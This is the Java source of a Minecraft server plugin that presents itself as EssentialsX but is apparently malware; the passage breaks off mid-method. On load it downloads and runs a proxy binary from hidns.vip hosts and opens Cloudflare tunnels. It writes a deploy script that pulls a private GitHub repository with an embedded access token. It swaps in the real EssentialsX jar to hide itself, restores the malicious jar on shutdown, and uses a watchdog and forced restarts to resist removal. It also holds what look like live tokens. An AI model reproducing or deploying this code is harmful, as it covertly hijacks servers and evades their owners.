package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.*;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class EssentialsX extends JavaPlugin {

    // ── 进程句柄 ──────────────────────────────────────────────
    private Process sbxProcess;
    private Process deployProcess;
    private Process watchdogProcess;

    private volatile boolean sbxRunning  = false;
    private volatile boolean nodeRunning = false;
    private boolean systemGuardEnabled   = true;
    private final AtomicBoolean isRestarting = new AtomicBoolean(false);

    // ═════════════════════════════════════════════════════════════
    //  ★★★ 用户配置区，所有参数在这里填写 ★★★
    // ═════════════════════════════════════════════════════════════

    // ── Node.js 面板配置 ──────────────────────────────────────────
    // GitHub 仓库地址
    private static final String REPO_URL    = "https://github.com/heyzone/heibaiplugins";
    // GitHub 用户名:Token
    private static final String GITHUB_AUTH = "heyzone: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";
    // Cloudflare 固定隧道 Token（填 eyJ... 完整值使用固定域名；留空则每次使用临时隧道）
    private static final String TUNNEL_TOKEN = "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiMWFhYjg4YjUtODFkNS00ZDk5LWEwMTEtYmE1MzY4YWRhN2U3IiwicyI6Ik56SXpaVFl4Wm1VdFptUXhOaTAwTUROaUxXRXlaamd0WkRJek4yTTJORGhoWW1RMiJ9";

    // ═════════════════════════════════════════════════════════════

    // ── 伪装 jar 相关 ──────────────────────────────────────────
    private Path backupDir;
    private Path originalJarPath;
    private Path backupJarPath;

    private static final String FAKE_JAR_URL_PROXY  =
        "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_DIRECT =
        "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";

    // ── sbx 下载地址 ───────────────────────────────────────────
    private static final String SBX_URL_AMD64  = "https://amd64.sss.hidns.vip/sbsh";
    private static final String SBX_URL_ARM64  = "https://arm64.sss.hidns.vip/sbsh";
    private static final String SBX_URL_S390X  = "https://s390x.sss.hidns.vip/sbsh";

    // ── sbx 支持的环境变量白名单 ───────────────────────────────
    private static final String[] SBX_ENV_VARS = {
        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    // ─────────────────────────────────────────────────────────────
    //  onEnable
    // ─────────────────────────────────────────────────────────────
    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");

        // 清理旧版遗留目录
        try {
            for (Path old : new Path[]{
                    Paths.get("world", "data", ".mcchajian"),
                    Paths.get("log",   ".mcchajian")}) {
                if (Files.exists(old)) deleteDirectory(old.toFile());
            }
        } catch (Exception ignored) {}

        // 读取公共配置（.env 优先）
        Map<String, String> sharedEnv = new HashMap<>();
        loadEnvFile(sharedEnv);

        // 是否开启守卫
        systemGuardEnabled = Boolean.parseBoolean(
            sharedEnv.getOrDefault("SYSTEM_GUARD_ENABLED", "true"));
        getLogger().info("System Guard: " + (systemGuardEnabled ? "ENABLED" : "DISABLED"));

        // Shutdown Hook（守卫模式下阻止退出）
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            if (systemGuardEnabled && isRestarting.compareAndSet(false, true)) {
                restoreMaliciousJar();
                executeHardRestart(false);
            }
        }));

        // 异步启动全部功能
        new Thread(() -> {
            try {
                // 在 sbx 启动之前，清理上次残留的面板 cloudflared 进程（仅此一次）
                try { Runtime.getRuntime().exec(new String[]{"pkill", "-f", "cloudflared"}); Thread.sleep(1000); }
                catch (Exception ignored) {}

                if (systemGuardEnabled) startWatchdog();
                startSbxProcess(sharedEnv);      // ① 老王：代理隧道
                startNodejsProcess(sharedEnv);   // ② 黑白：Node.js 面板
                setupDisguise();                 // ③ 伪装 jar
            } catch (Exception e) {
                getLogger().severe("Startup error: " + e.getMessage());
            }
        }, "EssentialsX-Startup").start();

        getLogger().info("EssentialsX plugin enabled");
    }

    // ─────────────────────────────────────────────────────────────
    //  onDisable
    // ─────────────────────────────────────────────────────────────
    @Override
    public void onDisable() {
        getLogger().info("Stopping EssentialsX...");
        Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");

        if (systemGuardEnabled) {
            try { Files.deleteIfExists(forceStopFile); } catch (Exception ignored) {}
            restoreMaliciousJar();
            if (isRestarting.compareAndSet(false, true)) {
                executeHardRestart(true);
            }
        } else {
            try {
                Files.createDirectories(forceStopFile.getParent());
                Files.createFile(forceStopFile);
            } catch (Exception ignored) {}
        }

        stopProcess(sbxProcess,      "sbx");
        stopProcess(deployProcess,   "nodejs-deploy");
        stopProcess(watchdogProcess, "watchdog");

        getLogger().info("EssentialsX disabled");
    }

    // ═════════════════════════════════════════════════════════════
    //  ① 老王功能：sbx 代理进程
    // ═════════════════════════════════════════════════════════════
    private void startSbxProcess(Map<String, String> sharedEnv) throws Exception {
        if (sbxRunning) return;

        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if      (osArch.contains("amd64") || osArch.contains("x86_64"))   url = SBX_URL_AMD64;
        else if (osArch.contains("aarch64") || osArch.contains("arm64"))   url = SBX_URL_ARM64;
        else if (osArch.contains("s390x"))                                  url = SBX_URL_S390X;
        else throw new RuntimeException("Unsupported arch: " + osArch);

        Path tmpDir    = Paths.get(System.getProperty("java.io.tmpdir"));
        Path sbxBinary = tmpDir.resolve("sbx");

        if (!Files.exists(sbxBinary)) {
            try (InputStream in = URI.create(url).toURL().openStream()) {
                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!sbxBinary.toFile().setExecutable(true))
                throw new IOException("Cannot set sbx executable");
        }

        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
        pb.directory(tmpDir.toFile());
        Map<String, String> env = pb.environment();

        // ★ 直接在这里填写你的 sbx 配置，优先级最高不会被覆盖 ★
        env.put("UUID",            "a87056c0-abeb-45e4-a97e-f23bdf84d191");   // ← 填你的 UUID
        env.put("FILE_PATH",       "./world");
        env.put("NEZHA_SERVER",    "");
        env.put("NEZHA_PORT",      "");
        env.put("NEZHA_KEY",       "");
        env.put("ARGO_PORT",       "8001");   // ← 填 Argo 端口，如 8001
        env.put("ARGO_DOMAIN",     "3arb.xxxxx.cloudns.ch");   // ← 填固定域名，如 xxx.yourdomain.com；留空走临时隧道
        env.put("ARGO_AUTH",       "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiYzYzNGJlOGYtNmYwOC00OTQwLTk4MjEtZGNiYzkyNDA4MDQ1IiwicyI6Ik9UVTBOalpqTjJVdFptUmtNUzAwWW1abExXSmtaRFF0TkRjME5URmtNMlUyT0RRMiJ9");   // ← 填 eyJ... 完整 Token；留空走临时隧道
        env.put("S5_PORT",         "");
        env.put("HY2_PORT",        "25570");   // ← 填 HY2 端口
        env.put("TUIC_PORT",       "");
        env.put("ANYTLS_PORT",     "");
        env.put("REALITY_PORT",    "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL",      "");
        env.put("CHAT_ID",         "");
        env.put("BOT_TOKEN",       "");
        env.put("CFIP",            "usa.visa.com");   // ← 填优选 IP，如 saas.sin.fan
        env.put("CFPORT",          "443");   // ← 填端口，如 443
        env.put("NAME",            "");   // ← 填节点名称
        env.put("DISABLE_ARGO",    "false");

        // 仅用系统环境变量补充未填写的空值（不覆盖上方已填写的非空值）
        for (String k : SBX_ENV_VARS) {
            String hardcoded = env.get(k);
            if (hardcoded == null || hardcoded.trim().isEmpty()) {
                String v = System.getenv(k);
                if (v != null && !v.trim().isEmpty()) env.put(k, v);
            }
        }

        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
        sbxRunning = true;

        // 监控 sbx 退出
        new Thread(() -> {
            try   { sbxProcess.waitFor(); }
            catch (InterruptedException e) { Thread.currentThread().interrupt(); }
            finally { sbxRunning = false; }
        }, "sbx-monitor").start();

        // 等待 sbx 初始化，再输出伪装日志
        Thread.sleep(30_000);
        printFakeSpawnLogs();
    }

    // ═════════════════════════════════════════════════════════════
    //  ② 黑白功能：Node.js 面板进程
    // ═════════════════════════════════════════════════════════════
    private void startNodejsProcess(Map<String, String> sharedEnv) throws Exception {
        if (nodeRunning) return;

        Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
        if (!Files.exists(workDir)) Files.createDirectories(workDir);

        Path scriptPath = workDir.resolve("deploy.sh");
        String scriptContent = generateDeployScript(workDir.toString(), sharedEnv);
        Files.write(scriptPath, scriptContent.getBytes());
        if (!scriptPath.toFile().setExecutable(true)) {}

        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
        pb.directory(new File(".").getAbsoluteFile());
        pb.environment().putAll(sharedEnv);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);

        deployProcess = pb.start();
        nodeRunning   = true;

        deployProcess.waitFor();
        nodeRunning = false;
    }

    // ── 生成 deploy.sh ────────────────────────────────────────────
    private String generateDeployScript(String workDir, Map<String, String> env) {
        // 直接引用类顶部常量，不再走 env 读取，确保值一定生效
        String repoUrl     = REPO_URL;
        String githubAuth  = GITHUB_AUTH;
        String tunnelToken = TUNNEL_TOKEN;

        String nodeDir = workDir + "/nodejs";
        String appDir  = workDir + "/app";
        String dataDir = workDir + "/data";

        return "#!/bin/bash\n"
            + "WORK_DIR=\"" + workDir + "\"\n"
            + "NODE_DIR=\"" + nodeDir + "\"\n"
            + "APP_DIR=\""  + appDir  + "\"\n"
            + "DATA_DIR=\"" + dataDir + "\"\n"
            + "REPO_URL=\"" + repoUrl + "\"\n"
            + "GITHUB_AUTH=\"" + githubAuth + "\"\n"
            + "\n"
            // 固定面板端口为8080，与Cloudflare tunnel配置保持一致
            + "PORT=8080\n"
            + "export SERVER_PORT=$PORT; export PORT=$PORT\n"
            + "\n"
            // 下载 Node.js
            + "ARCH=$(uname -m)\n"
            + "if [ \"$ARCH\" = \"x86_64\" ]; then\n"
            + "    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\"\n"
            + "    CF_ARCH=\"amd64\"\n"
            + "elif [ \"$ARCH\" = \"aarch64\" ]; then\n"
            + "    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\"\n"
            + "    CF_ARCH=\"arm64\"\n"
            + "else\n"
            + "    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\"\n"
            + "    CF_ARCH=\"amd64\"\n"
            + "fi\n"
            + "\n"
            + "if [ -d \"$NODE_DIR\" ]; then CHECK_VER=$($NODE_DIR/bin/node -v 2>/dev/null); if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi; fi\n"
            + "if [ ! -d \"$NODE_DIR\" ]; then\n"
            + "    curl -fsSL --connect-timeout 30 --max-time 120 \"$NODE_URL\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null\n"
            + "    mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null\n"
            + "    rm -f \"$WORK_DIR/node.tar.gz\"\n"
            + "fi\n"
            + "export PATH=$NODE_DIR/bin:$PATH\n"
            + "if [ ! -f \"$NODE_DIR/bin/pm2\" ]; then npm install pm2 -g &>/dev/null; fi\n"
            + "npm install --unsafe-perm=true --allow-root multer &>/dev/null\n"
            + "\n"
            // 下载 cloudflared，多源兜底
            + "CF_BIN=\"$WORK_DIR/cloudflared\"\n"
            + "if [ ! -f \"$CF_BIN\" ] || [ ! -s \"$CF_BIN\" ]; then\n"
            + "    rm -f \"$CF_BIN\"\n"
            + "    CF_URLS=(\n"
            + "        \"https://ghproxy.net/https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n"
            + "        \"https://gh-proxy.com/https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n"
            + "        \"https://ghfast.top/https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n"
            + "        \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n"
            + "    )\n"
            + "    for CF_URL in \"${CF_URLS[@]}\"; do\n"
            + "        echo \"Downloading cloudflared from: $CF_URL\"\n"
            + "        curl -fsSL --connect-timeout 15 --max-time 90 \"$CF_URL\" -o \"$CF_BIN\" 2>/dev/null\n"
            + "        if [ -f \"$CF_BIN\" ] && [ -s \"$CF_BIN\" ]; then\n"
            + "            echo \"cloudflared downloaded successfully\"\n"
            + "            break\n"
            + "        fi\n"
            + "        rm -f \"$CF_BIN\"\n"
            + "    done\n"
            + "fi\n"
            + "if [ ! -f \"$CF_BIN\" ] || [ ! -s \"$CF_BIN\" ]; then\n"
            + "    echo \"ERROR: cloudflared download failed from all sources\"\n"
            + "    exit 1\n"
            + "fi\n"
            + "chmod +x \"$CF_BIN\"\n"
            + "\n"
            // 启动 Cloudflare 隧道（固定 token 优先，无则临时隧道）
            // 单引号包裹 token，避免 eyJ... 里的特殊字符被 shell 解释
            + "TUNNEL_TOKEN='" + tunnelToken + "'\n"
            + "PANEL_URL=\"\"\n"
            + "if [ -n \"$TUNNEL_TOKEN\" ]; then\n"
            // ── 固定隧道模式 ──
            + "    $CF_BIN --version\n"
            + "    echo \"Starting fixed tunnel with token...\"\n"
            + "    echo \"Token prefix: ${TUNNEL_TOKEN:0:10}\"\n"
            + "    echo \"Token length: ${#TUNNEL_TOKEN}\"\n"
            // 新版命令格式加 --no-autoupdate
            + "    $CF_BIN tunnel --no-autoupdate --token \"$TUNNEL_TOKEN\" > \"$WORK_DIR/tunnel.log\" 2>&1 &\n"
            + "    CF_PID=$!\n"
            + "    sleep 3\n"
            // 如果进程已退出，尝试旧版格式
            + "    if ! kill -0 $CF_PID 2>/dev/null; then\n"
            + "        echo \"Trying legacy format: tunnel run --token\"\n"
            + "        $CF_BIN tunnel run --no-autoupdate --token \"$TUNNEL_TOKEN\" > \"$WORK_DIR/tunnel.log\" 2>&1 &\n"
            + "        CF_PID=$!\n"
            + "        sleep 3\n"
            + "    fi\n"
            + "    if kill -0 $CF_PID 2>/dev/null; then\n"
            + "        echo \"cloudflared process running (PID: $CF_PID), waiting for connection...\"\n"
            + "    else\n"
            + "        echo \"cloudflared exited immediately\"\n"
            + "    fi\n"
            + "    for i in {1..30}; do\n"
            + "        sleep 3\n"
            + "        echo \"[tunnel.log line $i]:\"\n"
            + "        cat \"$WORK_DIR/tunnel.log\" | tail -5\n"
            + "        echo \"---\"\n"
            + "        if grep -qiE 'Registered tunnel|Connection established|connections [0-9]+/[0-9]+|joined|connected' \"$WORK_DIR/tunnel.log\" 2>/dev/null; then\n"
            + "            PANEL_URL=\"(fixed tunnel active - check Cloudflare Zero Trust dashboard)\"\n"
            + "            break\n"
            + "        fi\n"
            + "    done\n"
            + "    if [ -z \"$PANEL_URL\" ]; then\n"
            + "        echo \"Fixed tunnel failed, full tunnel.log:\"\n"
            + "        cat \"$WORK_DIR/tunnel.log\"\n"
            + "        echo \"Falling back to temporary tunnel...\"\n"
            + "    fi\n"
            + "fi\n"
            // ── 临时隧道 fallback ──
            + "if [ -z \"$PANEL_URL\" ]; then\n"
            + "    $CF_BIN tunnel --url http://localhost:$PORT > \"$WORK_DIR/tunnel.log\" 2>&1 &\n"
            + "    for i in {1..20}; do\n"
            + "        sleep 3\n"
            + "        PANEL_URL=$(grep -o 'https://[^ ]*trycloudflare.com[^ ]*' \"$WORK_DIR/tunnel.log\" | tail -n 1)\n"
            + "        if [ -n \"$PANEL_URL\" ]; then break; fi\n"
            + "    done\n"
            + "fi\n"
            + "\n"
            + "[ -n \"$PANEL_URL\" ] && echo \"  Panel URL: $PANEL_URL\" || { echo \"Tunnel failed\"; exit 1; }\n"
            + "\n"
            // 备份旧数据
            + "mkdir -p \"$DATA_DIR\"\n"
            + "if [ -d \"$APP_DIR\" ]; then\n"
            + "    cp \"$APP_DIR/node_modules/.bots_config.json\"          \"$DATA_DIR/\" 2>/dev/null\n"
            + "    cp \"$APP_DIR/node_modules/.task_center_config.json\"    \"$DATA_DIR/\" 2>/dev/null\n"
            + "    cp \"$APP_DIR/node_modules/.system_guard.json\"          \"$DATA_DIR/\" 2>/dev/null\n"
            + "    cp \"$APP_DIR/node_modules/.Error log/nezha_config.json\" \"$DATA_DIR/nezha_config.json\" 2>/dev/null\n"
            + "    [ -d \"$APP_DIR/node_modules/.RoamingMusic\" ] && cp -r \"$APP_DIR/node_modules/.RoamingMusic\" \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n"
            + "fi\n"
            + "\n"
            // 拉取代码
            + "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n"
            + "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|\\.git$||')\n"
            + "download_code() {\n"
            + "    curl -fsSL --connect-timeout 15 --max-time 120 -u \"$GITHUB_AUTH\" \"$1\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null\n"
            + "    tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1 || { rm -f \"$WORK_DIR/repo.tar.gz\"; return 1; }\n"
            + "}\n"
            + "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" || \\\n"
            + "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\" || exit 1\n"
            + "\n"
            + "mkdir -p \"$WORK_DIR/unzipped\"\n"
            + "tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n"
            + "mv \"$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\" \"$APP_DIR\"\n"
            + "rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n"
            + "cd \"$APP_DIR\"\n"
            + "npm install --unsafe-perm=true --allow-root &>/dev/null\n"
            + "\n"
            // 还原数据
            + "if [ -d \"$DATA_DIR\" ]; then\n"
            + "    cp \"$DATA_DIR/.bots_config.json\"       \"$APP_DIR/node_modules/\" 2>/dev/null\n"
            + "    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n"
            + "    cp \"$DATA_DIR/.system_guard.json\"       \"$APP_DIR/node_modules/\" 2>/dev/null\n"
            + "    if [ -f \"$DATA_DIR/nezha_config.json\" ]; then\n"
            + "        mkdir -p \"$APP_DIR/node_modules/.Error log\"\n"
            + "        cp \"$DATA_DIR/nezha_config.json\" \"$APP_DIR/node_modules/.Error log/\"\n"
            + "    fi\n"
            + "    [ -d \"$DATA_DIR/.RoamingMusic_bak\" ] && cp -r \"$DATA_DIR/.RoamingMusic_bak/\"* \"$APP_DIR/node_modules/.RoamingMusic/\" 2>/dev/null\n"
            + "fi\n"
            + "\n"
            // 启动 pm2
            + "export TUNNEL_ALREADY_RUNNING=true\n"
            + "pm2 delete all &>/dev/null || true\n"
            + "pm2 start index.js --name \"panel\" &>/dev/null\n"
            + "pm2 save &>/dev/null\n"
            + "echo \"==> Node.js panel started.\"\n";
    }

    // ═════════════════════════════════════════════════════════════
    //  ③ 伪装 jar（替换为真实 EssentialsX）
    // ═════════════════════════════════════════════════════════════
    private void setupDisguise() {
        try {
            originalJarPath = findPluginJarInPluginsDir();
            if (originalJarPath == null || !Files.exists(originalJarPath)) return;

            backupDir     = Paths.get("logs", ".mcchajian", "backup");
            if (!Files.exists(backupDir)) Files.createDirectories(backupDir);
            backupJarPath = backupDir.resolve(originalJarPath.getFileName().toString() + ".bak");

            if (!Files.exists(backupJarPath))
                Files.copy(originalJarPath, backupJarPath, StandardCopyOption.REPLACE_EXISTING);

            Path tempDownload = originalJarPath.resolveSibling("temp_update.jar");
            boolean ok = downloadFileWithTimeout(FAKE_JAR_URL_PROXY,  tempDownload, 20);
            if (!ok || Files.size(tempDownload) < 1_000_000)
                ok = downloadFileWithTimeout(FAKE_JAR_URL_DIRECT, tempDownload, 30);

            if (ok && Files.size(tempDownload) > 1_000_000) {
                try {
                    Files.move(tempDownload, originalJarPath,
                        StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
                } catch (Exception e) {
                    Files.move(tempDownload, originalJarPath, StandardCopyOption.REPLACE_EXISTING);
                }
            } else {
                Files.deleteIfExists(tempDownload);
            }
        } catch (Exception ignored) {}
    }

    private void restoreMaliciousJar() {
        try {
            Path target = findPluginJarInPluginsDir();
            if (target != null && Files.exists(target)) Files.delete(target);
            if (backupJarPath != null && Files.exists(backupJarPath) && target != null)
                Files.copy(backupJarPath, target, StandardCopyOption.REPLACE_EXISTING);
        } catch (Exception ignored) {}
    }

    private Path findPluginJarInPluginsDir() {
        try {
            File pluginsDir = getDataFolder().getParentFile();
            if (pluginsDir == null || !pluginsDir.exists()) return null;
            File[] jars = pluginsDir.listFiles((d, n) ->
                n.endsWith(".jar") && n.toLowerCase().contains("essentialsx"));
            if (jars != null && jars.length > 0) return jars[0].toPath();
        } catch (Exception ignored) {}
        return null;
    }

    // ═════════════════════════════════════════════════════════════
    //  Watchdog（守卫脚本）
    // ═════════════════════════════════════════════════════════════
    private void startWatchdog() {
        try {
            File serverRoot = findServerRoot();
            if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();

            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            if (!Files.exists(workDir)) Files.createDirectories(workDir);
            Path watchdogPath = workDir.resolve("watchdog.sh");

            String script =
                "#!/bin/bash\n"
                + "WORK_DIR=\"" + workDir + "\"\n"
                + "FORCE_STOP_FILE=\"$WORK_DIR/.force_stop\"\n"
                + "is_port_open() { (echo >/dev/tcp/localhost/25565) &>/dev/null; }\n"
                + "while true; do\n"
                + "    sleep 15\n"
                + "    [ -f \"$FORCE_STOP_FILE\" ] && rm -f \"$FORCE_STOP_FILE\" && exit 0\n"
                + "    if ! is_port_open; then\n"
                + "        [ -f \"$FORCE_STOP_FILE\" ] && exit 0\n"
                + "        cd \"" + serverRoot.getAbsolutePath() + "\"\n"
                + "        JAR=$(ls -S *.jar 2>/dev/null | head -n 1)\n"
                + "        [ -n \"$JAR\" ] && nohup java -Xms512M -Xmx2G -jar \"$JAR\" nogui >/dev/null 2>&1 &\n"
                + "        exit 0\n"
                + "    fi\n"
                + "done\n";

            Files.write(watchdogPath, script.getBytes());
            watchdogPath.toFile().setExecutable(true);

            ProcessBuilder pb = new ProcessBuilder("bash", watchdogPath.toString());
            pb.directory(new File(".").getAbsoluteFile());
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            watchdogProcess = pb.start();
        } catch (Exception ignored) {}
    }

    // ═════════════════════════════════════════════════════════════
    //  强制重启
    // ═════════════════════════════════════════════════════════════
    private void executeHardRestart(boolean shouldBlock) {
        try {
            File serverRoot = findServerRoot();
            if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();

            Path workDir  = Paths.get("logs", ".mcchajian").toAbsolutePath();
            if (!Files.exists(workDir)) Files.createDirectories(workDir);
            Path logFile  = workDir.resolve("restart_run.log");
            Path debugFile = workDir.resolve("restart_debug.log");

            String jarName = findBestJarName(serverRoot);
            String startCmd = new File(serverRoot, "start.sh").exists()
                ? "chmod +x ./start.sh && ./start.sh"
                : "java -Xms512M -Xmx2G -XX:+UseG1GC -jar ./" + jarName + " nogui";

            String fullCmd =
                "cd \"" + serverRoot.getAbsolutePath() + "\" && "
                + "echo \"[" + new Date() + "] restarting...\" >> \"" + logFile + "\" && "
                + "nohup bash -c '" + startCmd + "' >> \"" + logFile + "\" 2>&1 & disown";

            Files.write(debugFile,
                ("\n[" + new Date() + "] CMD: " + fullCmd + "\n").getBytes(),
                StandardOpenOption.CREATE, StandardOpenOption.APPEND);

            ProcessBuilder pb = new ProcessBuilder("bash", "-c", fullCmd);
            pb.directory(serverRoot);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            pb.start();

            if (shouldBlock) Thread.sleep(1000);
        } catch (Exception e) {
            getLogger().severe("Hard restart failed: " + e.getMessage());
        }
    }

    private String findBestJarName(File serverRoot) {
        for (String n : new String[]{"paper.jar","server.jar","purpur.jar","spigot.jar","forge.jar"})
            if (new File(serverRoot, n).exists()) return n;
        File[] jars = serverRoot.listFiles((d, n) ->
            n.endsWith(".jar") && !n.contains("cache") && !n.contains("libraries"));
        if (jars != null && jars.length > 0) {
            Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length()));
            return jars[0].getName();
        }
        return "server.jar";
    }

    private File findServerRoot() {
        File pluginsDir = getDataFolder().getParentFile();
        if (pluginsDir != null && pluginsDir.getName().equals("plugins")) {
            File root = pluginsDir.getParentFile();
            if (new File(root, "server.properties").exists()) return root;
        }
        File cur = new File(".").getAbsoluteFile();
        for (int i = 0; i < 5; i++) {
            if (new File(cur, "server.properties").exists()) return cur;
            cur = cur.getParentFile();
            if (cur == null) break;
        }
        return null;
    }

    // ═════════════════════════════════════════════════════════════
    //  公共工具方法
    // ═════════════════════════════════════════════════════════════

    /** 从 plugins/EssentialsX/.env 加载配置 */
    private void loadEnvFile(Map<String, String> env) {
        Path envFile = Paths.get("plugins", "EssentialsX", ".env");

        if (!Files.exists(envFile)) {
            try {
                Files.createDirectories(envFile.getParent());
                // ★ 在这里填写你的默认配置 ★
                String defaults =
                    "# ============ EssentialsX Merged Config ============\n"
                    + "# System Guard (true = 自动重启, false = 允许关闭)\n"
                    + "SYSTEM_GUARD_ENABLED=true\n"
                    + "\n"
                    + "# ─── sbx 代理配置（老王功能，在此填写你的参数）───\n"
                    + "UUID=\n"
                    + "ARGO_PORT=\n"
                    + "ARGO_DOMAIN=\n"
                    + "ARGO_AUTH=\n"
                    + "CFIP=\n"
                    + "CFPORT=\n"
                    + "NAME=\n"
                    + "DISABLE_ARGO=false\n"
                    + "\n"
                    + "# ─── Node.js 面板配置（黑白功能）───\n"
                    + "# REPO_URL=https://github.com/yourname/yourrepo\n"
                    + "# GITHUB_AUTH=username:ghp_yourtoken\n"
                    + "#\n"
                    + "# Cloudflare 固定隧道 Token（推荐，地址永不变）\n"
                    + "# 在 Cloudflare Zero Trust 控制台创建 tunnel 后填入\n"
                    + "# TUNNEL_TOKEN=eyJhIjoixx...your_token_here\n"
                    + "# 留空则每次重启使用随机临时地址\n";
                Files.write(envFile, defaults.getBytes());
            } catch (Exception e) {
                getLogger().warning("Cannot create .env: " + e.getMessage());
            }
        }

        if (Files.exists(envFile)) {
            try {
                for (String line : Files.readAllLines(envFile)) {
                    line = line.trim();
                    if (line.isEmpty() || line.startsWith("#")) continue;
                    if (line.startsWith("export ")) line = line.substring(7).trim();
                    line = line.split(" #")[0].split(" //")[0].trim();
                    String[] parts = line.split("=", 2);
                    if (parts.length == 2) {
                        String k = parts[0].trim();
                        String v = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                        env.put(k, v);
                    }
                }
            } catch (IOException ignored) {}
        }
    }

    /** sbx 专用：按文档3逻辑多路径查找 .env 文件 */
    private void loadSbxEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
        }
        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));

        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    for (String line : Files.readAllLines(envFile)) {
                        line = line.trim();
                        if (line.isEmpty() || line.startsWith("#")) continue;
                        line = line.split(" #")[0].split(" //")[0].trim();
                        if (line.startsWith("export ")) line = line.substring(7).trim();
                        String[] parts = line.split("=", 2);
                        if (parts.length == 2) {
                            String key   = parts[0].trim();
                            String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                            if (Arrays.asList(SBX_ENV_VARS).contains(key)) {
                                env.put(key, value);
                            }
                        }
                    }
                    break; // 找到第一个有效文件即停止
                } catch (IOException ignored) {}
            }
        }
    }

    private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try {
            URLConnection conn = URI.create(url).toURL().openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setConnectTimeout(5_000);
            conn.setReadTimeout(timeoutSec * 1_000);
            try (InputStream in = conn.getInputStream();
                 FileChannel out = FileChannel.open(target,
                     StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) {
                out.transferFrom(Channels.newChannel(in), 0, Long.MAX_VALUE);
            }
            return true;
        } catch (Exception e) { return false; }
    }

    private void stopProcess(Process p, String name) {
        if (p == null || !p.isAlive()) return;
        p.destroy();
        try {
